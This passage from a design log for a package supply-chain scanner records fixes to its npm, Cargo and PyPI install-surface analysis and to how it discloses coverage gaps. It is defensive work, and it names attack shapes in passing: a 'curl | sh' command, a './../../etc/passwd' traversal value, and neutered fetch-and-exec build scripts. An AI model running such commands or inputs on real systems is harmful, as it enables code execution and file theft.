(`git diff` + POST to an RFC 5737 TEST-NET-3 placeholder) → `VC-002f` critical/block, correct source URL in
evidence; the pre-existing `testdata/adversarial/cargo-buildrs-exfil` fixture (raw-socket exfil + reverse
shell, a different technique class using no reqwest/ureq at all) unchanged at `VC-002d` critical/block. FP
validation: Microsoft's own documented `git rev-parse --short HEAD` version-stamping pattern → exit 0, zero
findings; the prebuilt-binary-fetch-plus-unrelated-`cc`-compile shape (`TestHostileBuildRS`'s own documented
ambiguous case) → exit 0 by default / exit 2 with `-fail-on-eligible`, only the pre-existing `VC-002b`
(network egress, medium) fires — the new OPU-39 markers correctly silent in both cases.

Residual limitations, carried forward from the handoff: no dataflow tracking backs the identifier-vs-literal
heuristic in `cargoFetchExecCandidateRe` — a contrived `let cmd = "sh"; Command::new(cmd)` (a variable that
happens to hold a hardcoded literal) would still match even though it executes nothing fetched; not observed
in either real campaign, flagged as a known imprecision rather than silently accepted. HTTP client coverage
is scoped to `reqwest`/`ureq`, the two dominant crates by a wide margin but not exhaustive (`hyper`, `surf`,
`attohttpc` uncovered). `gitContentReadRe`'s subcommand exclusion list is a judgment call checked against one
documented real example, not a large corpus of real git-integrating build.rs files. Only two campaigns drove
this patch — the broader research survey's remaining clusters were typosquat/namespace-squat patterns better
addressed by name-similarity detection (VC-006) than install-surface analysis, and are out of scope here.

## D-134 — publishable-root load-time analysis must not be gated on lifecycle scripts (bug in D-132's own pass)

**Trigger:** a BleepingComputer report (Aug 25 2026) on threat actors abusing npm mirrors — UNPKG,
npmmirror — as free hosting for phishing pages. The packages carry two files (`index.html` + a `package.json`
declaring the HTML as `main`), no install hooks and no JS; victims arrive via a browser hitting
`https://unpkg[.]com/<pkg>@<ver>/index[.]html`, not via `npm install`. Investigating whether depSNORT had a
gap here surfaced a real bug in the OPU-38 pass shipped as D-132.

**Scope decision — the phishing-hosting technique itself is deliberately NOT addressed.** It is not a
dependency-graph attack: nothing depends on these packages, installing one is harmless (OX Security's own
words: "downloading it wouldn't do harm"), and the victim is an email recipient rather than a developer
resolving a lockfile. The researchers' own recommended control — treat direct HTML requests to mirror
domains as suspicious — is a network/email-filter concern, not a scanner's. Two further facts confirm the
boundary rather than argue against it: `manifestPath` requires `manifestDeclaresDeps`, so a
zero-dependency 2-file package is not discovered as a project at all; and a pure
`fetch(...).then(v => location.href = atob(v))` browser redirect carries no JS execution signal, so
`loadTimeExecJS` correctly declines it — a redirect is not import-time code execution, and teaching the
load-time model to call it one would misuse the model and invite FPs on every package shipping demo or
docs HTML. Building a phishing-HTML detector here would be coverage theater; recorded as a considered no.

**The real bug.** D-132's publishable-root pass bailed out with `if len(m.Scripts) == 0 { continue }` placed
BEFORE its own load-time (entry-module) analysis. A published package with no lifecycle scripts at all, whose
entry module runs a loader the instant a consumer imports it, was therefore completely invisible when scanned
as its own root — reinstating, for publishable roots, exactly the RedC2 evasion OPU-31 added load-time
analysis to catch. The main lockfile-resolved loop never had this bug: it guards only the script pass with
`if len(m.Scripts) > 0` and then runs the entry-candidate loop unconditionally. The fix makes the
publishable path structurally identical to the main loop; the two code regions are now textually the same.

**Mutation-proven, and the proof itself needed a correction.** A first mutation attempt used a naive
`str.replace` and silently mutated BOTH the main loop and the publishable path, because the fix had made
them identical — a contaminated proof. Redone anchored to the publishable path alone (asserting exactly one
occurrence in the tail region): the main loop stays untouched and precisely one test,
`TestD134ScriptsLessPublishableRootEntryModuleAnalyzed`, fails. The paired
`TestD134ScriptsPresentStillAnalyzed` fixture differs from it by a single harmless `"test": "echo ok"`
entry, isolating the defect to the scripts-count guard and nothing else.

**Validation:** full suite green (34 packages), `-race` clean on `internal/ecosystem/npm`. Live CLI
before/after on a scripts-less publishable package with a loader entry module (inert RFC 5737 C2
placeholder): before, exit 0 with zero findings and zero hook nodes — entirely invisible; after,
`VC-002b` (network egress) and `VC-002e` (decode-and-execute) on
`hook:pkg:npm/loader-pkg@1.0.0#module-load:index.js`. FP check: an ordinary scripts-less library entry
module (`require`/`module.exports`, no exec signal) produces zero findings and zero hooks — the load-time
pass is still gated on a JS-precise execution signal, so removing the scripts guard adds no noise.
`TestD134PrivateScriptsLessRootStillExcluded` confirms the `"private": true` application-root guard still
dominates on the path this fix opened up.

Residual limitations: the fix is npm-only — whether the other ecosystems' publishable-root paths carry the
same script-gating shape was not audited here. `exports`-as-object entry resolution remains unresolved
(pre-existing, documented at `npmEntryCandidates`), so a package exposing its loader only through an
`exports` map is still missed. And the zero-dependency discovery floor noted above means a malicious package
that declares no dependencies is not reachable by a CLI scan at all, whatever its entry module does — a
real boundary, recorded rather than papered over.

## D-135 — cross-ecosystem audit of the D-134 bug class, and a conformance suite for it

**Trigger:** D-134 fixed one adapter (npm) whose publishable-root pass gated its entry-module analysis behind
`len(m.Scripts) == 0 { continue }`. That entry's own residual note asked whether the other ecosystems carried
the same shape. This is that audit.

**Result: npm was the only adapter with the bug.** All six others were already structurally correct, and
three of them are worth naming because they show the right shape explicitly. Cargo computes `hasBuildRs` and
`rootIsProcMacro` independently and checks each independently inside the root loop, so neither gates the
other. NuGet gathers PowerShell hooks and MSBuild scripts separately, enters on `len(scripts) > 0 ||
len(msbuildScripts) > 0`, and passes BOTH to `applyHooks`. Composer computes `flatScripts` unconditionally
and `pluginSource` under its own semantic gate (`type == "composer-plugin"`, which is a correct condition,
not a proxy for another analysis), then hands both to `AnalyzePHP`. RubyGems collects extconf, gemspec and
Rakefile independently and early-returns only when ALL THREE are empty. PyPI's two `len(...) == 0` early
exits (the wheel-only `PthFiles` skip, and `extractLocalPython`'s both-inputs-empty return) are benign: in
each case the skipped call would receive only-empty inputs. gomod runs a single analysis over every collected
source, so it has no second analysis to strand.

**A structural reason npm was the outlier, not bad luck.** The other six adapters iterate `g.Roots` directly
and treat the root as just another node. npm alone grew a SEPARATE second pass (the OPU-38 publishable-root
loop) bolted beside its lockfile-keyed main loop, and that new pass re-derived the script/entry ordering from
scratch instead of mirroring the loop 100 lines above it. The duplicated-logic seam is where the contract
leaked — the same shape as the D-15 leaks that motivated the conformance package in the first place.

**The deliverable: `internal/ecosystem/conformance/installsurface_test.go`.** Reading six adapters and
declaring them fine is not proof — D-134's guard also read as obviously benign ("nothing to analyze") and was
not. So the audit is frozen as an executable contract instead. Each case deletes the FIRST analysis's
precondition and keeps only the SECOND's, then asserts the second still fires: npm (no scripts, loader entry
module), cargo (no build.rs, proc-macro crate), nuget (no PowerShell, MSBuild target), rubygems (no
extconf/Rakefile, gemspec declaring extensions), pypi (no setup.py, pyproject build-backend), composer (no
scripts, plugin entrypoint). gomod is recorded as single-analysis and exempt.
`TestEveryInstallSurfaceExtractorHasAsymCoverage` then asserts every adapter implementing
`ecosystem.InstallSurfaceExtractor` either has a case or an explicit exemption, so a seventh ecosystem cannot
ship into step 5 without answering this question — the same coverage guarantee
`TestEveryExpandedEcosystemIsCovered` already gives the walk.

**Mutation-proven, both halves.** Reintroducing the exact D-134 guard in npm fails precisely the npm subtest
with its intended diagnostic and leaves the other five passing. Deleting the cargo entry from `asymCases()`
fails the coverage test naming cargo. Neither test passes vacuously.

**Secondary finding — a narrow gate that is correct and must not be "fixed".** The first rubygems fixture
failed, and the cause was the fixture, not the adapter: `AnalyzeRuby`'s gemspec branch fires only on a
gemspec DECLARING native extensions (`extensions` and `extconf` both present), not on arbitrary gemspec
content. That looked like under-coverage — a `.gemspec` is executed Ruby, so `system("curl | sh")` in one
would be missed. It is deliberate: scanning all gemspec content trips `CapExec` on the ubiquitous
`` s.files = `git ls-files`.split("\n") `` idiom, verified directly against `scanCaps` (caps=[exec],
evidence=[`]). Widening it would fire on a large fraction of real gems. Recorded here with the proof so the
next person does not read the narrow gate as an oversight and turn every Ruby scan into an FP flood; the
fixture carries the same note inline.

Residual limitations: the contract covers only the asymmetric-precondition class the audit was chartered
for — it does not assert that each adapter's analyses are individually CORRECT, only that neither strands
the other. Fixtures exercise the root path; the dependency-scan paths (vendored crates, module cache,
sdists, `vendor/`) are not covered by this suite. The gemspec content-gate scope question above is
documented, not resolved.

## D-136 — resolve `exports`-as-object entry modules (npm)

**Trigger:** D-134's residual note. `npmEntryCandidates` read `main`, `module`, and the conventional
`index.{js,mjs,cjs}`, and its own comment recorded that "`exports`-as-object is not resolved in this pass
(documented limitation)". That limitation had teeth: `exports` REPLACES `main` in Node's own resolution when
present, so a package can ship its entry — and a loader that runs the instant a consumer imports it — with no
`main` at all. Reproduced before writing any fix: four realistic shapes (string form, `{".": path}`,
conditions object, subpath-only) each produced ZERO hooks. This is the modern packaging default, so the gap
was widening over time rather than shrinking.

**The fix:** `exportsEntryPaths` walks the raw `exports` value and returns every package-relative module path
reachable through it, feeding the existing `add` normalizer alongside `main`/`module`.

**Every exported path is collected, not just `"."`.** Importing `pkg/feature` executes whatever `./feature`
maps to, exactly as importing `pkg` executes `"."`. A loader parked behind a secondary subpath runs on import
just the same, and that is the shape the live-fire fixture below uses.

Four decisions inside the walk, each with a reason:
- **Map keys are sorted before descending.** Go randomizes map iteration and these paths become graph node
  IDs; an unsorted walk would make two scans of the same tree disagree. This package has determinism tests
  precisely because that class of bug has bitten before.
- **Wildcards are skipped** (`"./f/*": "./src/f/*.js"`). A pattern names a SET this static pass cannot
  enumerate without walking the tree. Skipping them also means legitimate packages with many subpaths — which
  use wildcards rather than enumerating — contribute few entries, not many.
- **Bare specifiers are skipped** (`"node:fs"`, another package name): they name no file in this package.
  **`null` blocks a subpath** and contributes nothing.
- **Two bounds on attacker-supplied JSON**: `maxExportsDepth` (8) against stack exhaustion from nesting, and
  `maxExportsEntries` (256) against a crafted map. The manifest's size is already bounded by the contained
  reader, and real packages never approach either, so both exist only to bound hostile input. Malformed
  `exports` is non-fatal — main/module and the conventional candidates still apply.

**Mutation-proven, three mechanisms independently.** Dropping the `exportsEntryPaths` wiring fails the
end-to-end regression. Disabling the key sort fails the determinism test with a concrete order change
(`[./a ./c ./b ./d ./e]` vs `[./d ./e ./a ./c ./b]`). Removing the depth guard makes the 5000-deep fixture
return `./x.js` instead of nothing. A fourth check is defense in depth rather than a new guard: an exports
value naming `"./../../etc/passwd"` is refused by the existing `add` normalizer before it can reach the
contained reader, which would refuse it again.

**One correction during the work, recorded because the test was wrong and the code was right.** The
`conditions` case initially asserted `[./d/i.cjs, ./d/i.mjs]`. It fails: ordering follows the sorted CONDITION
KEYS (`import` < `require`), not the path strings, so the correct order is `[./d/i.mjs, ./d/i.cjs]`. The
sibling `nested_conditions` case (`default` < `import`) already encoded the right rule and passed throughout,
which is what identified the expectation as the error. The test now says so inline.

**Validation:** full suite green (34 packages), `-race` clean on `internal/ecosystem/npm` and
`internal/ecosystem/conformance`. Live CLI before/after on a package whose loader hides behind a SECONDARY
subpath (`"./telemetry"`), with no `main` and nothing at a conventional `index.*` path: before, exit 0 with
zero findings and zero hook nodes; after, `VC-002b` and `VC-002e` on
`hook:...#module-load:dist/telemetry.js`. The same fixture's benign `.mjs`/`.cjs` `"."` entries produce no
hooks, and a wholly benign two-subpath exports package produces none either — the load-time pass is still
gated on a JS-precise execution signal, so resolving more entry paths adds reach without adding noise.

Residual limitations: **wildcard subpaths remain unresolved** — a loader reachable only through
`"./f/*"` is still missed, and resolving it would require walking the package tree, which this pass
deliberately does not do. `exports` is npm-only; no other ecosystem has an equivalent field. Node's real
resolution picks ONE condition arm per import; this pass collects every arm, which is deliberate (the
scanner cannot know how a consumer will import) and means an unreachable-in-practice arm is still analyzed —
over-collection, never under.

## D-137 — resolve wildcard `exports` subpath targets against the tree (npm)

**Trigger:** D-136's own residual note. That entry resolved concrete `exports` paths but skipped wildcard
patterns, because a pattern names a SET rather than one file and enumerating it needs the tree. A loader
reachable only through `"./features/*"` was therefore still invisible. Reproduced before writing any fix:
both a flat wildcard target and one whose match sits in a nested directory produced ZERO hooks.

**`*` matches across `/`, so this is a recursive walk, not a glob.** Node's subpath patterns are a string
substitution: `*` captures any substring INCLUDING path separators, so `"./f/*": "./src/f/*.js"` makes
`pkg/f/deep/nested/loader` resolve to `./src/f/deep/nested/loader.js`. A single-directory match would have
found the shallow files and missed exactly the ones an attacker would prefer. The live-fire fixture below
puts the loader a directory deeper than its benign sibling for that reason.

**The fix:** `exportsPathsMatching` now partitions the exports walk into concrete paths and wildcard targets
(`exportsEntryPaths` / `exportsWildcardTargets` are the two halves, so D-136's tests keep their exact
meaning). `resolveExportsWildcards` splits each target on its wildcards, walks from the deepest fully-literal
directory of the prefix, and collects files matching prefix and suffix. `npmEntryCandidatesResolved` merges
the result with the static candidates, deduplicated — a file can be both a concrete export and a wildcard
match — and both call sites use it.

**Multiple `*` in one target over-collects, deliberately.** Node substitutes the SAME capture for every `*`,
so `"./src/*/index-*.js"` constrains matches more tightly than prefix+suffix alone. Solving that exactly is
only tractable for a single `*`; with more, prefix/suffix matching returns a superset. That is the safe
direction for a scanner — it analyzes files that may not be reachable rather than missing ones that are — and
it matches the posture already in place, which scans `index.js`/`index.mjs`/`index.cjs` whether or not they
are exported. Recorded rather than silently accepted.

**Containment and bounds.** Every listing and read goes through the contained reader, so a directory
symlinked out of the package is refused rather than followed — proven by a test that plants such a symlink
and asserts nothing outside the tree appears. A target containing `..` is refused before the walk as well.
Nested `node_modules` (other packages, analyzed on their own nodes) and dot-directories are skipped, so a
broad wildcard cannot sweep the dependency tree into one package's surface. Three bounds apply because this
walk touches the filesystem: matches per package (64 — each is read and scanned), directory entries examined
(4096), and walk depth (16). `os.ReadDir` returns entries sorted by name and the target list arrives sorted,
so the result is deterministic without further sorting.

**Mutation-proven, three mechanisms.** Dropping the wildcard wiring fails the end-to-end regression. Making
the walk non-recursive fails the resolution-shapes test — the nested match disappears, which is precisely
the `*`-spans-`/` semantics. Removing the `node_modules`/dot-directory skip fails the exclusion test.

**Validation:** full suite green (34 packages), `-race` clean on `internal/ecosystem/npm` and
`internal/ecosystem/conformance`. Live CLI before/after on a package whose loader is reachable ONLY through a
wildcard and sits a directory deeper than its benign sibling: before, exit 0 with zero findings and zero hook
nodes; after, `VC-002b` and `VC-002e` on `module-load:src/plugins/analytics/collect.js`, with the sibling
`src/plugins/format.js` correctly producing nothing. The FP boundary matters more here than in D-136 — a
wildcard can pull in many files — and a wholly benign three-file wildcard package still produces no hooks,
because the load-time pass remains gated on a JS-precise execution signal.

Residual limitations: the multiple-`*` superset above. Resolution is bounded, and a package exceeding the
match cap has the remainder unanalyzed without that being surfaced as a coverage gap — acceptable at 64
entry modules per package, but it is a silent stop rather than a disclosed one. `exports` remains npm-only.
Wildcard resolution reads the tree, so it finds nothing for a dependency whose source is not on disk (a
pre-install tree with no `node_modules`), exactly as the concrete-path pass already behaved.

## D-138 — a scan bound that truncates enumeration is a disclosed coverage gap

**Trigger:** D-137's own residual note. Wildcard resolution stopped at three bounds — matches, directory
entries examined, walk depth — and returned what it had, silently. That sits directly against R-01, the
principle this repo's whole gap layer was built on: a refusal reported as an absence is
attacker-triggerable invisibility. A bound is a slower route to the same place. "We stopped looking" was
being rendered as "we looked and found nothing", and a package could put its loader past entry 64 of a
wildcard-reachable directory to get there.

**The fix:** a new `instsurf.GapTruncated` ("scan-bound-truncated"), recorded by `resolveExportsWildcards`
whenever a bound stops it with material still unexamined. The gap is attributed to the package node and its
detail names which bounds tripped and their limits. Unlike every other reason in that file, nothing was
refused and nothing failed to read — the scanner chose to stop — which is exactly why it needed its own
reason rather than being folded into `GapUnreadable`.

**One gap per package, not one per skipped directory.** A broad wildcard over a large tree can trip the
bound at many points; emitting a gap at each would drown the coverage report this exists to inform. The
three bound flags are collected during the walk and rendered once at the end.

**The off-by-one is the whole correctness question, and it is tested directly.** A package with EXACTLY the
cap's worth of matches was fully examined and must NOT be reported as truncated — otherwise the fix attaches
a coverage gap to a package whose surface is completely known, which is its own kind of dishonesty. The
`bounded` helper is only consulted at points reached when there is more to examine, so the flag means real
truncation rather than a walk that finished. `TestD138ExactCapIsNotTruncation` pins it, and the mutation
that trips the cap one entry early fails it with `expected all 64 matches, got 63`.

**Mutation-proven:** removing the gap recording fails both the unit disclosure test and the end-to-end
propagation test; the off-by-one mutation above fails the exact-cap boundary.

**Validation:** full suite green (34 packages), `-race` clean on `internal/ecosystem/npm` and
`internal/ecosystem/instsurf`. Live CLI on a package with 200 wildcard-reachable modules against a cap of
64: `install_surface_gaps: 1`, `install_surface_gap_reasons: ["scan-bound-truncated x1"]`, the detail naming
the package and `package.json (exports wildcard resolution)`, a stderr warning, and the coverage line
concluding *"This report is NOT an all-clear."* The same fixture at 40 modules — under the cap — reports
`install_surface_gaps: 0` and no reasons, so the disclosure tracks actual truncation rather than merely the
presence of a wildcard.

Residual limitations: only the wildcard resolver discloses its bounds. The `exports` JSON walk's own
`maxExportsDepth`/`maxExportsEntries` (D-136) still truncate silently — they bound a manifest already
size-capped by the contained reader and are unreachable for legitimate input, but that is an argument about
likelihood, not a disclosure. `AnalyzeLoadTime`'s 16-reference sibling cap and gomod's `maxGoFiles` are the
same shape elsewhere in the tree. Making bound-disclosure uniform across every capped enumeration is the
honest follow-up; this entry closes one instance and names the rest rather than implying the class is done.

## D-139 — correction to D-133: OPU-39's Cargo markers require crate source already on disk

**Trigger:** a depSNORT evaluation of `MoSLoF/fluxfang` reported 364 install-surface gaps
(`source-unavailable`) across the Cargo side and noted the new OPU-39 build.rs markers "didn't fire here."
The eval read that as a property of the scan. Investigating it shows it is a property of the TOOL that
D-133 — which I wrote — failed to disclose.

**What D-133 claimed and what is actually true.** D-133 presents the three markers as closing the
arrayref/proc-macro1 gap, and its residual-limitations paragraph lists dataflow imprecision, the
`reqwest`/`ureq` client scope, and the git-subcommand judgment call. It says nothing about needing the
crate's source to be locally present. Tracing the code:

- `scanCargoDependency` resolves a dependency's source through `findCargoDependencyDir`, which looks in
  `vendor/<name>`, `vendor/<name>-<version>`, and then `$CARGO_HOME/registry/src/*/<name>-<version>`. All
  local. When none exists it records `GapUnavailable` and returns; the markers never receive content.
- A network path for build.rs DOES exist — `registry.CrateSourceClient.ResolveBuildRS` — but it is reachable
  only from `enrichYankLure`, behind a chain of gates: the crate must be YANKED, must match
  `YankLureShape()`, and only the build-deps INTRODUCED by its live-newest version are fetched. No flag
  exposes it for the general case.

**Empirically reproduced, both directions, on one fixture.** A Cargo project depending on `arrayref@0.3.7`,
scanned twice with the same binary: with the crate vendored (an IOC-neutered reproduction of the campaign's
own build.rs — TLS bypass, fetch, exec) it fires `VC-002f` critical/block and `VC-002e` high, exit 1. With
`vendor/` removed and `CARGO_HOME` pointed at an empty directory — a cold cache, which is what CI has — the
same project yields zero hook nodes, one `source-unavailable` gap, exit 0. Same crate, same malicious
build.rs; the only variable is whether the source was already on disk.

**Why this matters more than an ordinary caveat.** The campaign D-133 was built for is the case where it
bites hardest. During a compromise's exposure window the malicious versions are LIVE and not yet yanked —
yanking is what happens after discovery — so the yank-lure fetch path does not reach them either. Detection
therefore depends entirely on the scanning machine already holding the crate source. A developer who has run
`cargo build` has it and is covered. A cold CI clone, which is the posture a gating scanner is usually
deployed in, does not and is not.

**Not silently wrong — the gap IS disclosed.** `GapUnavailable` is recorded per unreachable crate and
surfaces as `install_surface_gaps` with `source-unavailable`, and the coverage line says the report is not
an all-clear. The tool tells the truth about what it did not examine; D-133's prose did not. This entry
corrects the ledger, which is the record people actually read to decide what the markers cover.

**Deliberately not changed here.** Wiring `CrateSourceClient` into the general Cargo install-surface path
would make an ordinary scan fetch build.rs for every unvendored dependency — a substantial change to the
tool's network posture (N registry fetches per scan, per-crate, on a project that may have hundreds), and
one that interacts with `-offline`, cache policy, and the data-source coverage model. That is a design
decision with real cost, not a defect fix, so it is raised rather than taken unilaterally. The options are:
leave detection local-only and document it (status quo plus this entry); add an opt-in flag that fetches
build.rs for unvendored crates; or make fetching the default with `-offline` as the escape. None is chosen
here.

Residual limitations: this entry corrects D-133's disclosure; it does not change behaviour, so every scan of
a cold Cargo tree still reports `source-unavailable` rather than analysis. The equivalent question for other
ecosystems was not examined — PyPI has an `SdistFetcher` used more broadly than the Cargo client, and
whether npm/gem/nuget dependency analysis has comparable source-availability preconditions is unaudited.

## D-140 — `-cargo-fetch-source`: opt-in build.rs fetch for unvendored crates

**Trigger:** D-139 established that Cargo install-surface analysis is local-only, so a cold clone gets none,
and put three options to the owner rather than choosing. The opt-in flag was chosen.

**The flag.** `-cargo-fetch-source` fetches `build.rs` from crates.io for cargo dependencies whose source was
not on disk, and runs it through `installsurface.AnalyzeRust` and `instsurf.AddToGraph` — the same path a
vendored crate takes, so every VC-002 check including the OPU-39 markers sees identical content either way.
Default posture is unchanged, `-offline` still wins through the client's own gate, and the existing
`cargo-source` client and cache are reused so a crate needed by both this pass and the yank-lure enrichment
is fetched once.

**Only crates the extraction reported as `source-unavailable` are fetched.** `resolveResult` now carries
those node IDs. Crates already read from `vendor/` or `$CARGO_HOME` are deliberately left alone: their
on-disk content is what the build will actually use, and a fetch could disagree with it.

**A new primitive was required, and reusing the existing one would have been a silent bug.**
`ResolveBuildRS` answers "what would a build pull for this requirement" and therefore skips yanked versions —
correct for the yank-lure enrichment it was written for. Analyzing a LOCKED dependency is a different
question. A lockfile may pin a version yanked after the fact (a stale lock is ordinary; the fluxfang eval's
own `spin@0.9.8` is exactly this), and that pinned version is what the build installs and whose build.rs
runs. Routed through the requirement path it would find no satisfying non-yanked version and return nothing —
silently, for precisely the crates most worth a look. `BuildRSAt` takes the exact version, looks its
published SHA-256 up including yanked entries, and still verifies it, so exactness costs no integrity
checking. `TestD140BuildRSAtReadsYankedWhereResolveDoesNot` asserts the two side by side so the reason the
primitive exists lives in a test, not only a comment.

**A stale gap is the same dishonesty pointed the other way.** The first working version still reported
`source-unavailable` for crates it had just fetched and analyzed — coverage claiming "not examined" about
something examined, which is D-138's problem mirrored. The pass now returns the set of nodes it resolved and
the caller clears their gaps: after a successful fetch the live CLI reports `install_surface_gaps: 0`. A
crate that genuinely ships no build.rs counts as resolved — that is the answer, not a failure to get one — while
a fetch ERROR leaves the gap standing, which `TestD140FetchErrorLeavesGapStanding` pins.

**Two test defects found and fixed during the work, both mine, both real.** The caps assertion read a joined
`caps` attribute that does not exist — `instsurf.setCaps` writes individual `cap.<name>` keys — so it was
asserting against `""` and would have passed for any content. And the no-build.rs case was set up as a 404,
which is a fetch error, not "this crate has no build script"; it therefore tested the error path while
claiming to test the resolved-but-empty path. Both corrected rather than worked around.

**Mutation-proven:** swapping `BuildRSAt` for `ResolveBuildRS` fails the yanked contrast test; marking a
failed fetch as examined fails the gap-standing test.

**Validation:** full suite green (34 packages), `-race` clean on `cmd/depsnort` and
`internal/datasource/registry`. Live CLI on a cold-cache Cargo project (`CARGO_HOME` pointed at an empty
directory, no `vendor/`): flag off → `source-unavailable`, zero hooks, unchanged from before; flag on with
`-offline` → still no fetch, gap stands; flag on live → `libc@0.2.155`'s real build.rs fetched and
checksum-verified from crates.io, a `build.rs` hook node on the crate, `cargo.build_rs_source: fetched`,
`cargo-source` coverage `queried 1 / gaps 0`, and `install_surface_gaps: 0`. In-repo, without network,
`TestD140FetchedBuildRSReachesTheGraph` fetches an IOC-neutered reproduction of the arrayref/proc-macro1
build.rs through a stub and asserts `cap.cradle`, `cap.obfuscation` and `cap.exec` land on the resulting
hook — the chain D-139 showed was broken, closed end to end.

Residual limitations: opt-in, so a scan that does not pass the flag still has D-139's gap — deliberate, and
the reason the flag is documented in `-h` rather than silently defaulted. Cost is one registry fetch per
unexamined crate; on a large cold tree that is hundreds of requests, bounded only by the crate count. The
`crates.io` versions endpoint is queried per crate with no batching. PyPI's equivalent question is
untouched: `SdistFetcher` is reachable from the yank-lure path under the same yanked-only gate, so a cold
PyPI tree has the analogous limitation and no equivalent flag.

## D-141 — correcting D-139/D-140 on PyPI, and the real offline bug that was there instead

**Trigger:** D-139 and D-140 both closed with the same residual claim — that PyPI carries the analogous
cold-tree limitation to Cargo, its `SdistFetcher` reachable only behind the yank-lure gate. Asked to close
that gap, the first step was to reproduce it. It does not exist.

**The claim was wrong, and the mistake is worth naming precisely.** There are two `SdistFetcher`
constructions in the CLI. `pypiLureSdist` (main.go) is the yanked-gated one used by `enrichYankLure` — the
one examined when writing D-139. `adapterRegistry` separately builds the scanning adapter with
`pypi.NewWithSdist(...)`, which wires the SAME fetcher type into the GENERAL install-surface path with no
yank gate at all: `ExtractInstallSurface` calls `a.Sdist.Fetch` for every non-root PyPI package. The
analogy to Cargo was asserted from the first construction without checking the second. Proven by scanning a
cold PyPI tree (`six`, `markupsafe`, no local source anywhere): three install-surface hooks and ZERO
`source-unavailable` gaps. PyPI has had cold-tree coverage all along.

**What was actually broken: `-offline` discarded the fetcher entirely.** `NewWithSdist` returned a bare
`&Adapter{}` when offline, leaving `a.Sdist == nil`, which `ExtractInstallSurface` handled with a bare
`continue`. Two consequences, both wrong and the second worse:

1. **A capability was thrown away.** `SdistFetcher.Fetch` already handles offline correctly — it serves from
   its cache and returns `"not in cache (offline)"` without touching the network. Dropping the fetcher meant
   sdists ALREADY CACHED went unanalyzed.
2. **The skip was silent.** No gap was recorded, so an offline run reported `install_surface_gaps: 0` and
   "0 partial install-surface extraction(s)" while having examined no PyPI dependency at all. That is a skip
   rendered as an absence — the exact R-01 invisibility this codebase refuses, and the same shape as D-138's
   silent truncation and D-140's stale gap. It matters most here because `-offline` is the mode people run
   in locked-down CI, precisely where honest coverage is the point.

**The fix is to stop dropping it.** `NewWithSdist` now passes `offline` THROUGH to the fetcher, which gates
the network itself. The silent `continue` disappears as a consequence: with a fetcher present, an offline
cache miss goes down the existing error path that already recorded a gap. The residual `a.Sdist == nil` case
(a caller using `pypi.New()`) now discloses rather than skipping, so the honest behaviour does not depend on
which constructor was used.

**A shipped test asserted the bug, and was changed deliberately.**
`TestExtractInstallSurfaceNilFetcher` read "nil fetcher should return nil" — it encoded the silent skip as
the contract. That is a contract being corrected, not a test bent to fit a change, and it now asserts the
gap with the reasoning inline so the reversal is legible.

**Mutation-proven:** restoring `if offline { return &Adapter{} }` fails the constructor and
no-network tests; restoring the bare `continue` fails the nil-fetcher disclosure test.

**Validation:** full suite green (34 packages), `-race` clean on `internal/ecosystem/pypi`. Live CLI on the
same cold PyPI tree, same binary pair: offline with a WARM cache goes from 0 hooks to 3 (cached sdists now
analyzed); offline with a COLD cache goes from `0 gaps` — silently clean — to two `unreadable` gaps naming
`six@1.16.0` and `markupsafe@2.1.3`. Online behaviour is unchanged.

**A consequence for D-140 the owner should weigh.** D-140 made Cargo build.rs fetching opt-in, and the
justification offered was that fetching per-dependency source would be "a substantial change to the tool's
network posture." That argument was weaker than presented: depSNORT ALREADY fetches per-dependency source
from a registry on every ordinary PyPI scan, by default. The two ecosystems are now inconsistent — PyPI
fetches by default, Cargo only behind `-cargo-fetch-source` — and the opt-in choice was made partly on a
premise this entry corrects. Flipping the default is a behaviour change and is not made here; it is raised
so the decision can be revisited on accurate grounds.

Residual limitations: wheel-only PyPI distributions still yield only `.pth` analysis, which is correct — a
wheel has no setup.py or build backend to examine — but means a wheel-only dependency's install surface is
thinner by nature, not by gap. An offline scan with a cold cache now reports one gap per PyPI dependency,
which on a large tree is many lines; that is the honest count rather than noise, but it is a visible change
for offline users. The npm/gem/nuget equivalents of this question remain unaudited — this entry corrects one
wrong claim and fixes one real bug, and deliberately does not generalize from either.

## D-142 — uniform bound-disclosure: every scan bound that stops short now says so

**Trigger:** D-138 gave the exports wildcard resolver a `GapTruncated` disclosure when its match cap stopped
an enumeration short. That fixed one bound. The tool has many, and the question left open was whether the
rest behaved the same way. They did not. The R-01 principle behind the gap layer — a refusal reported as an
absence is attacker-triggerable invisibility — applies with equal force to a bound: a scanner that stops at
file 5,000 and reports nothing is telling the operator "we read everything and found nothing" when the truth
is "we stopped."

**The sweep, and what it actually found.** Every `max*` constant reachable from an install-surface path was
triaged, and each was verified in code rather than assumed from its name or its comment. Three categories
came out of it. Bounds that are already disclosed: PyPI's `maxIncludeDepth` routes unfollowed includes into
`acc.unfollowed`, and the sdist size and entry caps surface as errors that the existing gap layer classifies
— these needed nothing. Bounds that are not truncation at all: input-validation ceilings that reject a whole
artifact rather than partially reading it already fail loudly. And three that stopped short in silence:

- `installsurface.maxLoadTimeRefs` (16) — an entry module's sibling `require`s were followed to sixteen
  distinct files and then `break`. A package splitting its payload across seventeen modules looked
  identical to one whose entry was clean.
- `npm`'s exports-walk `maxExportsDepth` (8) and `maxExportsEntries` (256) from D-136 — both returned early
  from the walk with no record.
- `gomod.maxGoFiles` (5000) — a bare `return` out of the source walk.

**One of these was worse than an undocumented gap.** `maxGoFiles`'s own comment read "hitting it records a
GapTruncated coverage gap, not a silent truncation." The code did not do that, and had never done it. A
reader auditing this file would have checked the comment, concluded the case was handled, and moved on. The
comment now says what the code does, and carries a note that it asserted this before it was true.

**`Surface.Truncated` is how the analyzer reports a bound it hit.** `installsurface.AnalyzeLoadTime` is
ecosystem-agnostic and has no Gaps sink, so it returns the fact and the adapters convert it. The invariant
that makes the field trustworthy is that a bound which merely EXISTS contributes nothing — only one that
actually stopped short of the end. The npm exports walk follows the same rule via `exportsTruncation`, which
keeps the walk itself pure and does the disclosure where a sink exists.

**Exactly-at-the-bound is complete coverage, not truncation.** This is the same line D-138 drew, and holding
it took real care in each of the three sites. In `AnalyzeLoadTime` the check sits AFTER the empty/duplicate
filters, so a module mentioning one sibling two hundred times is read once and reported as complete — a
naive implementation that counts mentions instead of distinct references marks it truncated, and the test
for that case fails against exactly that mutation.

**A false positive in the first cut of this change, found by writing the boundary test.** In `gomod` the
bound was initially checked at the top of the directory-entry loop, before the `.go` filter. A module with
exactly `maxGoFiles` sources plus any other file — a README, a testdata fixture — would reach one more
iteration with the count already at the cap and report truncation for material it was never going to read.
